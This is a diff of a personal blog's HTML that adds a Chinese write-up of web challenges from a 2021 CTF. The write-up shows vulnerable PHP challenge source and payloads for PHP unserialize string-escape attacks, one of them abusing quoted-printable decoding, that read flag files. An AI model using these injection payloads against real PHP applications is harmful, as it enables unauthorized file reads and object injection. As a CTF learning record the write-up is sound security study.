@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Troy3e</title>
+  <title itemprop="name">NEWSCTF_2021.6-Web复现 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -179,412 +179,319 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 0px;"></div>
-<div id="content" class="site-content">
-  
-  <div class="notice" style="margin-top:60px">
-    <i class="iconfont icon-notification">
-    </i>
-    <div class="notice-content">Social Phobia</div>
-  </div>
-  
-  <div class="top-feature-row">
-  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
-  <i class="fa fa-anchor" aria-hidden="true">
-  </i>
-  START:DASH!!</h1>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="https://space.bilibili.com/129300391" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/6326234.jpg">
-        </div>
-        <div class="info">
-          <h3>Bilibili</h3>
-          <p>博主的b站视频</p>
-        </div>
-      </a>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-48496.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-48496.jpg">
     </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      NEWSCTF_2021.6-Web复现</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png">
+          </a>
+        </span>
+        <span>
+          <a href="">Troy3e</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-6-5<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
   </div>
-  
-</div>
+
+<div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
-      <i class="fa fa-envira" aria-hidden="true"></i>
-      Discovery</h1>
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>虽然已经不打CTF了，但是还是要学习。比赛当天看了一遍题觉得还行，昨天wp出了来复现一下。<br>看了wp，题目难度中等，虽然都是见过的知识点，但是出的也很不错。</p>
+<p>一、easy_web<br>这个就不说了，简单题。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210605183050.png" alt></p>
+<pre><code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
+</code></pre><p>二、weblog</p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+class B{
+    public $logFile;
+    public $initMsg;
+    public $exitMsg;
+
+    function __construct($file){
+        // initialise variables
+        $this-&gt;initMsg=&quot;#--session started--#\n&quot;;
+        $this-&gt;exitMsg=&quot;#--session end--#\n&quot;;
+        $this-&gt;logFile =  $file;
+        readfile($this-&gt;logFile);
+
+    }
+
+    function log($msg){
+        $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+        fwrite($fd,$msg.&quot;\n&quot;);
+        fclose($fd);
+    }
+
+    function __destruct(){
+        echo &quot;this is destruct&quot;;
+    }
+}
+
+class A {
+    public $file = &#39;flag{xxxxxxxx}&#39;;
+    public $weblogfile;
+
+    function __construct() {
+        echo $this-&gt;file;
+    }
+
+    function __wakeup(){
+        // self::waf($this-&gt;filepath);
+        $obj = new B($this-&gt;weblogfile);
+
+    }
+
+    public function waf($str){
+        $str=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$str);
+        $str=str_replace(&#39;flag&#39;,&#39;&#39;,$str);
+        return $str;
+    }
+
+    function __destruct(){
+        echo &quot;this is destruct&quot;;
+    }
+
+}
+class C {
+    public $file;
+    public $weblogfile;
+}
+class D{
+    public $logFile;
+    public $initMsg;
+    public $exitMsg;
+}
+
+function is_serialized($data){
+
+    $r = preg_match_all(&#39;/:\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE);
+    if(!empty($r)) {
+        foreach($m[0] as $v){
+            $a = intval($v[1])+strlen($v[0])+intval(substr($v[0],1));
+            if($data[$a] !== &#39;&quot;&#39;)
+                 return false;
+        }
+    }
+    if(!is_string($data))
+        return false;
+    $data = trim($data);
+    if(&#39;N;&#39; === $data)
+        return true;
+    if(!preg_match(&#39;/^([adObis]):/&#39;,$data,$badions))
+        return false;
+    switch($badions[1]){
+        case &#39;a&#39;:
+        case &#39;O&#39;:
+        case &#39;s&#39;:
+            if(preg_match( &quot;/^{$badions[1]}:[0-9]+:.*[;}]\$/s&quot;, $data ) )
+                return true;
+            break;
+        case &#39;b&#39;:
+        case &#39;i&#39;:
+        case &#39;d&#39;:
+            if(preg_match(&quot;/^{$badions[1]}:[0-9.E-]+;\$/&quot;, $data))
+                return true;
+            break;
+    }
+    return false;
+
+}
+$log = $_GET[&#39;log&#39;];
+if(!is_serialized($log)){
+    die(&#39;no1&#39;);
+}
+$log1 = preg_replace(&quot;/A/&quot;,&quot;C&quot;,$log);
+$log2 = preg_replace(&quot;/B/&quot;,&quot;D&quot;,$log1);
+if(!unserialize($log2)){
+    die(&#39;no2&#39;);
+}
+$log = preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$log);
+$log = str_replace(&#39;flag&#39;,&#39;&#39;,$log);
+$log_unser = unserialize($log);
+?&gt;
+</code></pre><p>看着长，其实简单的很。<br>首先抛开waf不看。A类控制参数，B类readfile，而A类下wakeup下正好有个调用B类的obj。<br>所以直接</p>
+<pre><code>&lt;?php
+class A {
+    public $file;
+    public $weblogfile;
+}
+$a=new A();
+$a-&gt;weblogfile=&#39;flag.php&#39;;
+echo serialize($a);
+?&gt;
+</code></pre><p>即可，但是肯定不会这么简单的，关键在这里：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606004129.png" alt></p>
+<p>在前面用:&lt;8绕过了</p>
+<pre><code>$r = preg_match_all(&#39;/:\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE);
+</code></pre><p>之后，传到log2那里就变成了这样：</p>
+<pre><code>O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:14:&quot;flag{xxxxxxxx}&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;fflaglag.php&quot;;}
+</code></pre><p>显然这是无法成功反序列化的，我们需要让字符逃逸，长度为25</p>
+<pre><code>&quot;;s:10:&quot;weblogfile&quot;;s:40:
+</code></pre><p>利用flag和一堆符号都能换空的特点：</p>
+<pre><code>&lt;?php
+class A {
+    public $file=&#39;flagflagflagflagflagflag&lt;&#39;;
+    public $weblogfile=&#39;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&#39;;    
+}
+echo serialize (new A);
+</code></pre><p>这样传到log2那里就变成了：</p>
+<pre><code>O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:25:&quot;flagflagflagflagflagflag&lt;&quot;;s:10:&quot;weblogfile&quot;;s:40:&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&quot;;}
+</code></pre><p>变成了字符串的一部分，可以正常执行。<br>简单题。</p>
+<p>三、weblogin<br>看了提示好像又是个php反序列化字符串逃逸。。。<br>这个我懂，反序列化逃逸好出并且看起来比较难，我最近也出了一个字符串逃逸的，不过没这么复杂。</p>
+<p>源码很长，是一个处理用户的路由。这种很长的源码直接倒推，先找flag输出点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141052.png" alt></p>
+<p>看起来是要写个满足条件的文件才会输出flag。<br>全局搜索file_put，找到四个全是 file_put_contents($file,enc(serialize($p)));<br>来看一下这个enc：</p>
+<pre><code>function enc($str){
+    $_str = &#39;&#39;;
+    for($i=0;$i&lt;strlen($str);$i++){
+        if ($str[$i] !== &#39;=&#39;){
+            $_str = $_str.&#39;=&#39;.dechex(ord($str[$i]));
+        }else{
+            $_str = $_str.$str[$i].$str[$i+1].$str[$i+2];
+            $i = $i+2;
+        }
+    }
+    return $_str;
+} 
+</code></pre><p>试一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141828.png" alt></p>
+<p>转换成等号加16进制的ascii码。但是下面那个i+2很明显说明了不会处理已经编码过的，比如：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141937.png" alt></p>
+<p>有啥用呢，这就得看下面反序列化里面的伪协议：</p>
+<pre><code>$p = unserialize(filter(file_get_contents(&#39;php://filter/read=convert.quoted-printable-decode/resource=&#39;.$file))); 
+</code></pre><p>简单点说就是把上面编码过的解码，比如=31变成1，字符减少了两个。<br>接下来看控制生成文件的地方：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606153149.png" alt></p>
+<p>datafile可控。</p>
+<pre><code>class Action {
+public $data=array();
+public $username=&#39;Troy3e&#39;;
+public $password=&#39;Troy3e&#39;;
+public $datafile=&#39;flag01476f0ab4de69015b1b6e07a0e84095&#39;;
+public $act=&#39;register&#39;;
+}
+echo serialize(new Action());
+//O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:0:{}s:8:&quot;username&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;password&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flag01476f0ab4de69015b1b6e07a0e84095&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;}
+</code></pre><p>但是在这里面action无法控制，然而我们可以控制username和password，还是那句话，永远不要相信用户的输入。</p>
+<pre><code>&lt;?php
+class Action {
+    public $data=array(&#39;Troy3e&#39;,&#39;Troy3e&#39;);
+    public $username=&#39;&#39;;
+    public $password=&#39;&#39;;
+    public $datafile=&#39;&#39;;
+    public $act=&#39;&#39;;
+    }
+    echo serialize(new Action());
+?&gt;
+//O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:2:{i:0;s:6:&quot;Troy3e&quot;;i:1;s:6:&quot;Troy3e&quot;;}s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;}
+</code></pre><p>到这其实就很明显了username处控制长度逃逸出数组，password里面是我们控制的反序列化的内容。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606160638.png" alt></p>
+<p>十个。后面就不多说了，直接贴个官方payload：</p>
+<pre><code>username==50=50=50=50=50&amp;password=a&quot;;s:1:&quot;a&quot;;}s:8:&quot;username&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;password&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flagf528764d624db129b32c21fbca0cb8d6&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;}
+</code></pre><p>四、impossible ip<br>后面那个ssrf打fpm已经做烂了就不讲了，看一下前面这个socket。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606162314.png" alt></p>
+<p>这个知识点我倒是没见过，学习了。</p>
+<p>总结：<br>闲着没事，就看四个。这几个还是比较简单的。<br>溜了，学习去了。</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picturenull"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/wechat.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2021/06/03/vulnstack红队实战-一/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1145960.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1145960.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                vulnstack内网靶场(一)保姆级教程</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz",
+        appKey: "h05kFRgBHS516pQ6vIsYtG1B",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-  <div class="post-thumb">
-    <a href="/2021/04/09/NCTF2019-phar-matches-everything/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-4-9 20:04</div>
-      <a href="/2021/04/09/NCTF2019-phar-matches-everything/" class="post-title">
-        <h3>[NCTF2019]phar matches everything</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/04/09/NCTF2019-phar-matches-everything/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">Troy3e</a>
+            </h3>
+          </div>
         </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/04/06/Node-js/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140864.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-4-6 14:04</div>
-      <a href="/2021/04/06/Node-js/" class="post-title">
-        <h3>Node.js</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/04/06/Node-js/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/29/PHP原生类的利用总结/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-29 23:03</div>
-      <a href="/2021/03/29/PHP原生类的利用总结/" class="post-title">
-        <h3>PHP原生类的利用总结</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/PHP/">PHP<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/03/29/PHP原生类的利用总结/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/29/SSTI比较离谱的绕过/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139581.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-29 19:03</div>
-      <a href="/2021/03/29/SSTI比较离谱的绕过/" class="post-title">
-        <h3>SSTI比较离谱的绕过</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/03/29/SSTI比较离谱的绕过/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/28/BUU近期刷题记录/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139481.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-28 20:03</div>
-      <a href="/2021/03/28/BUU近期刷题记录/" class="post-title">
-        <h3>BUU近期刷题记录</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/03/28/BUU近期刷题记录/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/28/BUU-WebWP/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994294.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-28 20:03</div>
-      <a href="/2021/03/28/BUU-WebWP/" class="post-title">
-        <h3>BUU WebWP</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/BUU/">BUU<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/03/28/BUU-WebWP/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/25/Java反序列化学习/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1138790.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-25 16:03</div>
-      <a href="/2021/03/25/Java反序列化学习/" class="post-title">
-        <h3>Java反序列化学习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/03/25/Java反序列化学习/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/16/WP暂时停更/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1135928.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-16 11:03</div>
-      <a href="/2021/03/16/WP暂时停更/" class="post-title">
-        <h3>博客暂时停更</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/03/16/WP暂时停更/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/13/渗透测试之信息收集/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1134782.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-13 13:03</div>
-      <a href="/2021/03/13/渗透测试之信息收集/" class="post-title">
-        <h3>渗透测试之信息收集</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/03/13/渗透测试之信息收集/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-
-
-    </main>
-      <!-- 首页默认取最最新文章集 -->
-    <!-- 
-      <nav class="navigator">
-        
-        <a class="extend prev" rel="prev" href="/"><i class="iconfont icon-back"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-      </nav>
-     -->
-  </div>
-  
+        <hr>
+        <p><i class="iconfont icon-write"></i>SteamID：888007034</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
